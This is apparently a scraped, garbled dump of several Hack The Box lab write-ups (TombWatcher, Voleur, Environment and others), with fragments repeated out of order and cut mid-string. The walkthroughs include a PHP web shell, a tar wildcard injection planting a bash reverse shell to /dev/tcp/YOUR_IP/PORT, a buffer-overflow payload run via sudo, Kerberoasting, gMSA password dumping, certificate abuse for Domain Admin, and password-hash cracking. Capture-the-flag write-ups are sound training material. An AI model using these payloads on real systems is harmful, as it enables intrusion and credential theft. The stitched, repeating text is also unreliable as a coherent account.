sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

